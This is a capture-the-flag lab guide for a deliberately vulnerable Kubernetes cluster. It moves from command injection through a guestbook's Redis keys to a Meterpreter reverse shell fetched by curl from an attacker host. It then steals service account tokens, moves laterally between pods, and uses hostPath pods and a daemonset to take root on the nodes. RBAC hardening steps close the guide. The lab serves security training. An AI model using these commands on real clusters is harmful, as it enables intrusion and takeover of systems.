---
layout: exercise
exercise: 25
title: "Exercise: Kubernetes Own the Nodes"
tools: openssh-client dirbuster metasploit-framework curl 
directories_to_sync: ssh-config 
---

## Steps

1. Start up a fresh lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. Alternatively, use the hot key sequence below:

	```
	<hold down Alt><hit F2>lxterminal<HIT the enter key>
	```

2. Start your Kubernetes cluster - we will use this one for all Kubernetes exercises except for the Cloud Attacks, Peirates and Node Attacks:

   ```shell
   /sync/bin/suspend-all-vms.sh
   /sync/bin/start-bustakube.sh
   ```

3. Wait a minute for the VM to boot, then SSH into the control plane node on the cluster:

    ```shell
    ssh -i /sync/bustakube-node-key root@bustakube-controlplane
    ```

4. Run the stage script for the first scenario:

    ```shell
    /usr/share/bustakube/Scenario1-OwnTheNodes/stage-scenario-1.sh
    ```

5. Wait for the script to finish.

6. Start up a Firefox browser.  You can use the icon in the top left menu bar, or use the same "Run" process from step 1.  Then browse to the guestbook application via this URL:

    <http://bustakube-controlplane:31361/>

7. Enter in a message to show up in the guestbook and click "Submit".

8. Use the browser's "View Source" function to look at the source for this page.  In Firefox, you can either hit `Ctrl-U` or right-click the page and choose "View Page Source".

9. You may notice that the form intelligence is probably in the `controllers.js` file.

10. Start a second browser tab, use it to browse to this URL, then use the View Source function (`Ctrl-U` / "View Page Source"):

    <http://bustakube-controlplane:31361/controllers.js>

    (On Firefox, you can just put this in your URL bar: <view-source:http://10.23.58.40:31361/controllers.js>)

11. Notice that there are two functions.

    a. The first, sent on Guestbook message submission, sends a request like this:

    ```
    guestbook.php?cmd=set&key=messages&value=VALUE
    ```

    b. The second gets messages on the page by sending a request like this:

    ```
    guestbook.php?cmd=get&key=messages
    ```

    c. This may be a vulnerability -- `guestbook.php` is letting the form choose which key it will set. It may even let the attacker choose an arbitrary command.

    d. Let's check this out -- browse to this URL to see if we can set a key called `hacker` to `1`.

    <http://bustakube-controlplane:31361/guestbook.php?cmd=set&key=hacker&value=1>

    e. Now see if the key's value did indeed get set to 1 by browsing to this URL:

    <http://bustakube-controlplane:31361/guestbook.php?cmd=get&key=hacker>

    f. Excellent! It looks like the key gets updated (or set) in Redis.

    g. Spoiler: `guestbook.php` won't send a command besides `get` and `set`.

    h. We'll have to see if this is useful to us.

12. Let's go looking for any other web content that could be useful.  On your Kali system, start up `dirbuster`.  You can type `dirbuster` into a terminal window or use the same Run method we used in step 1.

13. Set the "Target URL" to: <http://bustakube-controlplane:31361/>

14. Use the `directory-list-lowercase-2.3-small.txt` wordlist

    a. Click `dirbuster`'s Browse button

    b. Navigate to `/usr/share/dirbuster/wordlists`

    c. Choose the file `directory-list-lowercase-2.3-small.txt`

15. Deactivate dirbuster's "Be Recursive" toggle

16. Click `dirbuster`'s Start button to start the scan, then click the "Results - List View" tab to switch to the Results view.

17. When dirbuster finds `/status.php` and `/guestbook.php`, click `dirbuster`'s Stop button. `status.php` will be all we'll need.

18. Open up a second browser tab and browse to this URL:

    <http://bustakube-controlplane:31361/status.php>

19. We should get an ERROR message. If not, reload that link again to get an ERROR.

    a. This error suggests that the `status.php` page runs a command that it gets from the Redis "command" key.  It defaults to a `curl` command.

    b. Remember that we're able to set arbitrary Redis keys using `guestbook.php`.

20. In a browser tab, use the `guestbook.php` page to set the command key to `whoami`:

    
    <http://bustakube-controlplane:31361/guestbook.php?cmd=set&key=command&value=whoami>

21. Now, load the `status.php` page to make the command execute - you may need to reload:

    <http://bustakube-controlplane:31361/status.php>

22. Repeat the previous two steps with different values if you like, to see that you have a shell.

23. Repeat 17, using the `guestbook.php` page to set the command key to `env | grep KUBERNETES` to look at the environment variables set in the pod

    ```text
    http://bustakube-controlplane:31361/guestbook.php?cmd=set&key=command&value=env|grep KUBERNETES
    ```

24. Repeat step 18 to see the command run.

25. Let's prep Metasploit to catch our shell.  Start a Metasploit console session:

    ```shell
    msfconsole
    ```

26. In the console, run these commands to start a listener:

    ```ruby
    use exploit/multi/handler
    set payload linux/x86/meterpreter/reverse_tcp
    set LHOST 10.23.58.30
    set ExitOnSession false
    exploit -j
    ```

27. Start another terminal window/tab. Create a Meterpreter binary, as a Linux 32-bit ELF file, encoded with shikata_ga_nai, which will connect back to your Kali host's port `4444`:

    ```shell
    cd ~

    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp \
    LHOST=10.23.58.30 LPORT=4444 -e x86/shikata_ga_nai -o mrsbin -f elf
    ```

28. Now stage a web server in that terminal, hosting the `mrsbin` binary:

    ```shell
    cd ~ ; python3 -m http.server 80
    ```

29. Let's now put a new command into the Redis database.  Go back to your browser tab that was submitting requests to `guestbook.php` and **enter this in the value field**:

    ```
    # curl http://10.23.58.30/mrsbin >mrsbin ; chmod 0700 mrsbin ; ./mrsbin
    # DO NOT TYPE THE ABOVE INTO A SHELL
    ```

30. Note that the complete URL bar in the previous step will look like:

    ```
    http://bustakube-controlplane:31361/guestbook.php?cmd=set&key=command&value=curl http://10.23.58.30/mrsbin >mrsbin ; chmod 0700 mrsbin ; ./mrsbin
    ```

31. Go back to the browser tab that was loading `status.php` and hit reload.  Alternatively, use this URL:

    <http://bustakube-controlplane:31361/status.php>

32. The status page will seem to be stuck loading forever.  This is good.  If you checked out your Python web server's output, you'll see that it has logged a `GET` request from the Kubernetes cluster, requesting the `mrsbin` binary:

    ```shell
    $ python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.23.58.41 - - [28/Jul/2023 00:52:13] "GET /mrsbin HTTP/1.1" 200 -
    ```

33. Go check your Metasploit console. You should now see a line that reads something like "Meterpreter session 1 opened…"

34. Congratulations! You've achieved remote code execution in a container that's in a pod in a Kubernetes cluster.

35. Interact with this new session:

    ```shell
    sessions -i 1
    ```

36. Upload a pod manifest YAML file into the container.

    ```shell
    upload /root/K8S-Exercise/attack-pod.yaml
    ```

37. Send a `kubectl` binary into the container you've compromised.

    ```shell
    upload /root/K8S-Exercise/kubectl
    ```

38. Instruct meterpreter to give you a minimal interactive shell in the pod. You won't get any immediate feedback from the system, just a pair of "Process … created" and "Channel … created" lines from Metasploit.

    ```shell
    shell
    ```

39. See what user you've scored.

    ```shell
    id
    ```

40. Type `hostname` to see what pod you've landed in.

    ```shell
    hostname
    ```

41. **Write down the pod name** -- you will need it later on when we harden the cluster.

    ```
    # This is only an example!
    frontend-7c8f6c566-97kfh
    ```

42. View the first flag.  You will likely want to zoom out.

    ```shell
    cat FLAG.txt
    ```

43. Let's get the service account that has been mounted into this container. Type this:

    ```shell
    mount | grep kubernetes
    ```

44. You'll see that the service account credentials are mounted into the container as `/run/secrets/kubernetes.io/serviceaccount`.

45. List that mount point via:

    ```shell
    ls /run/secrets/kubernetes.io/serviceaccount
    ```

46. We will need both the certificate authority file (`ca.crt`) and the token (`token`).

47. The format for the `kubectl` commands we'll be running is like so:

    ```
    # /var/www/html/kubectl --token=TOKENTEXT --certificate-authority=/path/ca.crt \
    # --server=https://kubernetes.default.svc.cluster.local:443 command-text
    ```

48. Let's make things easy on ourselves by eliminating the need to type all of those flags over and over.  We'll put things in variables and use an `alias`.  Type this:

    ```shell
    export DIR="/run/secrets/kubernetes.io/serviceaccount"
    alias kubectl="/var/www/html/kubectl --token=`cat $DIR/token` \
    --certificate-authority=$DIR/ca.crt \
    --server=https://kubernetes.default.svc.cluster.local:443"
    ```

49. Now make the `kubectl` binary we uploaded executable by typing:

    ```shell
    chmod u+x /var/www/html/kubectl
    ```

50. Now try asking the API server what pods exist and what nodes they're staged on by running:

    ```shell
    kubectl get pods -o wide
    ```

51. Let's try seeing if we can stage our own malicious pod into the cluster.  Take a look at the pod definition by running:

    ```shell
    cat attack-pod.yaml
    ```

52. Now try to stage it by running (and observe an error):

    ```shell
    kubectl apply -f attack-pod.yaml
    ```

53. It looks like our account is forbidden to do this.  There are certainly all kinds of other things you could do at this point, but let's see if we can move to another pod. It may have a service account that is allowed to stage pods in the cluster.

54. Run a `kubectl auth can-i` command to investigate what the authorization system allows:

    ```shell
    kubectl auth can-i exec pods
    ```

55. We get back a yes! Let's move laterally to the `redis-master` pod.  Look at your `kubectl get pods` output from earlier -- we need the full name of the `redis-master` pod.  We'll get it automatically with an embedded shell command.

    ```shell
    
    kubectl exec -it \
       $(kubectl get pods | grep redis-master | awk '{print $1}' ) -- /bin/bash
    ```


56. Congratulations! You're now in a second container in the cluster, possibly running on a different node. You will see text that says you're not in a proper TTY.

57. Type `id` to see what user you are.

    ```shell
    id
    ```

58. Type `hostname` to see that you are in fact in the `redis-master` pod.

    ```shell
    hostname
    ```

59. Let's make things easier on ourselves by adding a Meterpreter to this pod as well:

    ```shell
    curl http://10.23.58.30/mrsbin >mrsbin
    chmod 0700 mrsbin
    ./mrsbin
    ```

60. Hit `Ctrl-Z` then `Y` to background this Meterpreter channel.

61. Type `background` to get back to the Metasploit console.

    ```
    background
    ```

62. Type `sessions -l` (for list) to see that there's a second session available now.  The new one runs as `uid=0`!

    ```
    sessions -l
    ```

    - If there isn't a new session yet, your handler in Metasploit might not be accepting new connections.  If that's the case, use this troubleshooting step:

        ```
        exploit -j
        ```

63. Once you see a new session, type `sessions -i 2` to interact with the second session.

64. Upload two YAML files we'll use to start up pods from this Redis container.

    ```shell
    upload /root/K8S-Exercise/attack-pod.yaml
    upload /root/K8S-Exercise/daemonset-attack.yaml
    ```

65. Upload a kubectl binary to the Redis container.

    ```shell
    upload /root/K8S-Exercise/kubectl
    ```

66. Let's start a shell in this container by typing `shell` into the Metasploit console.

67. Make the shell interactive and easier to read by running a few commands:

    ```shell
    bash -i
    export PS1="\u@\h # "
    unalias ls
    export TERM=vt100
    ```

68. Now let's set up `kubectl` in the Redis master pod:

    ```shell
    chmod u+x kubectl

    export DIR="/run/secrets/kubernetes.io/serviceaccount"

    alias kubectl="/data/kubectl --token=`cat $DIR/token` \
    --certificate-authority=$DIR/ca.crt \
     --server=https://kubernetes.default.svc.cluster.local:443"
    ```

69. Now let's ask if we are allowed to create pods:

    ```shell
    kubectl auth can-i create pods
    ```

70. We got a yes! Take a look at my attack-pod.yaml file:

    ```shell
    cat attack-pod.yaml
    ```

71. In that YAML file, take a look at the `containers:` section's `volumeMounts:` list - this tells Kubernetes what named "volume" to mount onto what path in the container.

72. Also, note how the named volume `mount-root-into-mnt` is described in the `volumes:` section, showing what path from the node's host filesystem gets that name.

73. Finally, in that YAML file, notice that the container image we've chosen is `k8s.gcr.io/redis:e2e`.  We chose that because it's likely cached on the Kubernetes nodes. How would you determine this? You want to run a command like this, with the correct values for `STR1` and `STR2`:

    ```
    kubectl get pod redis-master-STR1-STR2 -o yaml | grep "image:"
    ```

    Here's a version you can copy and paste:

    ```shell
    kubectl get pod \
     `kubectl get pods | grep redis-master | awk '{print $1}' ` \
     -o yaml | grep "image:"
    ```

74. Let's deploy this attack pod, with a `kubectl apply -f`:

    ```shell
    kubectl apply -f attack-pod.yaml
    ```

    You can also tell Kubernetes to let you know when the new pod is ready:

    ```shell
    kubectl wait --for=condition=ready pod/attack-pod
    ```

75. Let's see where our pod is running, using:

    ```shell
    kubectl get pods -o wide
    ```

76. Let's go attack the node where that pod is running – you'll need to wait for the pod to be `Running`:

    ```shell
    kubectl exec -it attack-pod -- /bin/bash
    ```

77. Now we're in a container, in a pod that we designed, on one of the cluster nodes.  Find out which one:

    ```shell
    cat /mnt/etc/hostname
    ```

78. The `/mnt` directory in this container is the `/` directory on this node.  Let's look for a flag.

    ```shell
    ls /mnt
    ```

79. Grab a flag:

    ```shell
    cat /mnt/FLAG.txt
    ```

80. User `bustakube` has `sudo` rights on this node.  Let's change their password.

    ```shell
    chroot /mnt /bin/bash
    passwd bustakube
    bustakube
    bustakube
    exit
    ```

81. Now leave this `kubectl` exec, so that you're back in the Redis pod.

    ```shell
    exit
    ```

82. Confirm for yourself that you're in the redis pod by running `hostname`:

    ```shell
    hostname
    ```

83. Let's put an attack pod on every node in the cluster (including the control plane node). We'll use a daemonset. Take a look at its contents via:

    ```shell
    cat daemonset-attack.yaml
    ```

84. Note that this daemonset defines a pod that it will place on every node.  The pod has a container called `attack-root`.

85. Note how the pod mounts a volume called `hostroot`, which is the node's host filesystem `/`, onto the container's `/mnt`.

86. Let's apply this attack daemonset with:

    ```shell
    kubectl apply -f daemonset-attack.yaml
    ```

87. See where this staged pods by running:

    ```shell
    kubectl get pods -o wide
    ```

88. Go get your other node flag, by using a `kubectl exec` on the `attack-daemonset` pod that corresponds to the node you haven't compromised already.

    ```
    kubectl exec attack-daemonset-STR1 -- cat /mnt/FLAG.txt
    # Do not copy and paste this - you need to fill in STR1
    ```

89. Now, let's go compromise the control plane node.  Run a `kubectl` for whichever pod corresponds to the `bustakube-controlplane` (hint: look at the output of `kubectl get pods -o wide`):

    ```
    kubectl exec -it attack-daemonset-STR2 -- /bin/bash
    # Do not copy and paste this - you need to fill in STR2
    ```

90. Now change bustakube's password on the `bustakube-controlplane` system:

    ```shell
    chroot /mnt /bin/bash
    passwd bustakube
    ```

91. Enter in a password - we choose `bustakube` to keep things simple:

    ```
    bustakube
    bustakube
    ```

92. We are chrooted into the `/mnt` directory in this container (the `/` directory on this node). Let's look for a flag.

    ```shell
    ls /
    ```

93. Grab the last flag:

    ```shell
    cat /FLAG.txt
    ```

94. Finally, starting a new terminal on your Kali system, `ssh` into the `bustakube-controlplane` machine:

    ```shell
    ssh bustakube@bustakube-controlplane
    ```

95. Type the password you chose:

    ```
    bustakube
    ```

96. Switch to root:

    ```shell
    sudo su -
    ```

{% comment %}
NOTE: A quirk in the Markdown rendering means that three digit numbers (>= 100) for
numbered lists need to have their hanging blocks (code / link) indented by at least
94 spaces instead of 4, so for here, we use 2 tabs (8 spaces) for consistency.
{% endcomment %}

97. Congratulations! You've just compromised the cluster.  Take a deep breath.

98. Now let's lock this cluster down.

99. On the `bustakube-controlplane` machine, we'll find a directory full of YAML files:

    ```shell
    cd /usr/share/bustakube/Scenario1-OwnTheNodes/Defense/RBAC/
    ```

100. Look at contents of the` role-get-only-on-pods.yaml` file.  It defines a set of capabilities, a role, called `get-only-on-pods`.  This is an allowlist definition that allows any account with this role to execute "get" API requests on "pods."

    ```shell
    cat role-get-only-on-pods.yaml
    ```

101. Add this role to the default namespace with:

    ```shell
    kubectl apply -f role-get-only-on-pods.yaml
    ```

102. Take a look at what service accounts exist on the cluster in the default namespace:

    ```shell
    kubectl get serviceaccounts
    ```

103. Since there are already `frontend` and `redis` roles, we won't create them.  Look at the files used to create them.

        ```shell
        cat ../../Namespace-Default/service-account-frontend.yaml
        cat ../../Namespace-Default/service-account-redis.yaml
        ```

104. Now look at a role binding file, which assigns a role (capabilities) to a service account.

        ```shell
        cat binding-get-only-on-pods-frontend.yaml
        ```

105. Note that the role binding is pretty simple. It specifies a subject, in this case a service account, and a role, in this case, `get-only-on-pods`. It gives this pairing a name, "get-only-on-pods-redis-binding."

106. Apply the role bindings to both the `frontend` and `redis` roles:

        ```shell
        kubectl apply -f binding-get-only-on-pods-frontend.yaml
        kubectl apply -f binding-get-only-on-pods-redis.yaml
        ```

107. Next, delete the rolebindings that were giving more powerful roles to the `frontend` and `redis` service accounts:

        ```shell
        kubectl delete rolebinding frontend-get-list-exec-pods-binding
        kubectl delete rolebinding redis-full-rw-and-exec-on-pods-binding
        ```

108. Now check out how effective your RBAC has been.  First, delete the attack-pod.

        ```shell
        kubectl delete pod attack-pod
        ```

109. Next, `kubectl` exec into the same frontend pod that you started this exercise on:

        ```shell
        kubectl exec -it ${PODNAME-WRITTEN-DOWN-IN-STEP-38} -- /bin/bash
        ```

110. From the frontend pod, try to exec into the `redis-master` pod, as in the original attack:

        ```shell
        export DIR="/run/secrets/kubernetes.io/serviceaccount"

        alias kubectl="/var/www/html/kubectl --token=`cat $DIR/token` \
         --certificate-authority=$DIR/ca.crt \
         --server=https://kubernetes.default.svc.cluster.local:443"

        kubectl exec -it \
         $(kubectl get pods | grep redis-master | awk '{print $1}' ) -- /bin/bash
        ```

111. You should get a pretty involved error message, since the get pods will fail.

112. For extra credit, after the class ends, create a network policy that doesn't allow the `frontend` or `redis-master` pods to initiate any connections outbound, so that our original meterpreter can't connect back to the Metasploit console.
